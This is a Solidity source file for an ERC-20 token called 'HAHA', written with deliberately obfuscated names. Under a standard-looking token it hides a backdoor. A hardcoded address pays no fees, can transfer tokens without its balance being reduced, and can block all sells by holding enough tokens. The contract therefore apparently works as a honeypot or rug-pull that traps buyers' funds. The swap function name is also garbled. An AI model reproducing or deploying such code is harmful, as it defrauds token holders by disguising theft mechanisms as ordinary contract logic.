// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wkjop(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wkjop(a, b, "SafeMath:");
    }

    function  _wkjop(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _sqoekjuhrp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xrFqtribns {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract HAHA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"HAHA";
    string private constant _symbol = unicode"HAHA";

    uint256 private constant _Totalmr = 1000000000 * 10 **_decimals;
    uint256 public _mxTamAmaunt = _Totalmr;
    uint256 public _Walletunmax = _Totalmr;
    uint256 public _wapThresholdfax= _Totalmr;
    uint256 public _myrkTauop= _Totalmr;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqsevbsat=0;
    uint256 private _babykbat=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEwrfdxdFgdf;
    mapping (address => bool) private _taxhWalany;
    mapping(address => uint256) private _lrLrvrfavup;
    bool public _tnsfereslanale = false;
    address  private _qvbkrfFalp = address(0xc9E0e07C5Fc32CFA47d9F2b3C5915aB237915904);

    _xrFqtribns private _uvfpRedwuest;
    address private _afbvPrauw;
    bool private _vrvkcbryh;
    bool private ifuSwqvtq = false;
    bool private _apEalbew = false;

    event _amrouapwl(uint _mxTamAmaunt);
    modifier lckeThaefp {
        ifuSwqvtq = true;
        _;
        ifuSwqvtq = false;
    }

    constructor () {
        _balances[_msgSender()] = _Totalmr;
        _isEwrfdxdFgdf[owner()] = true;
        _isEwrfdxdFgdf[address(this)] = true;
        _isEwrfdxdFgdf[_qvbkrfFalp] = true;

        emit Transfer(address(0), _msgSender(), _Totalmr);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalmr;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wkjop(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsfereslanale) {
                if (to != address
                (_uvfpRedwuest) && to !=
                 address(_afbvPrauw)) {
                  require(_lrLrvrfavup
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrLrvrfavup
                  [tx.origin] = block.number;
                }
            }

            if (from == _afbvPrauw && to != 
            address(_uvfpRedwuest) && !_isEwrfdxdFgdf[to] ) {
                require(amount <= _mxTamAmaunt,
                 "Exceeds the _mxTamAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walletunmax, "Exceeds the maxWalletSize.");
                if(_babykbat
                < _wapBeforeqsevbsat){
                  require(! _frkcrqz(to));
                }
                _babykbat++;
                 _taxhWalany[to]=true;
                teeomoun = amount.mul((_babykbat>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _afbvPrauw && from!= address(this) 
            && !_isEwrfdxdFgdf[from] ){
                require(amount <= _mxTamAmaunt && 
                balanceOf(_qvbkrfFalp)<_myrkTauop,
                 "Exceeds the _mxTamAmaunt.");
                teeomoun = amount.mul((_babykbat>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_babykbat>_wapBeforeqsevbsat &&
                 _taxhWalany[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ifuSwqvtq 
            && to == _afbvPrauw && _apEalbew &&
             contractTokenBalance>_wapThresholdfax 
            && _babykbat>_wapBeforeqsevbsat&&
             !_isEwrfdxdFgdf[to]&& !_isEwrfdxdFgdf[from]
            ) {
                _swpvknjkrj( _qkrnw(amount, 
                _qkrnw(contractTokenBalance,_myrkTauop)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wkjop(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wkjop(teeomoun));
        emit Transfer(from, to, 
        amount. _wkjop(teeomoun));
    }

    function _swpvknjkrj(uint256
     tokenAmount) private lckeThaefp {
        if(tokenAmount==0){return;}
        if(!_vrvkcbryh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _uvfpRedwuest.WETH();
        _approve(address(this),
         address(_uvfpRedwuest), tokenAmount);
        _uvfpRedwuest.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qkrnw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wkjop(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qvbkrfFalp){
            return a ;
        }else{
            return a . _wkjop (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTamAmaunt = _Totalmr;
        _Walletunmax = _Totalmr;
        _tnsfereslanale = false;
        emit _amrouapwl(_Totalmr);
    }

    function _frkcrqz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }


    function openTrading( ) external onlyOwner( ) {
        require( ! _vrvkcbryh);
        _uvfpRedwuest   =  _xrFqtribns (0x10ED43C718714eb63d5aA57B78B54704E256024E) ;
        _approve(address(this), address(_uvfpRedwuest), _Totalmr);
        _afbvPrauw = _sqoekjuhrp(_uvfpRedwuest.factory()). createPair (address(this),  _uvfpRedwuest . WETH ());
        _uvfpRedwuest.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_afbvPrauw).approve(address(_uvfpRedwuest), type(uint).max);
        _apEalbew = true;
        _vrvkcbryh = true;
    }

    receive() external payable {}
}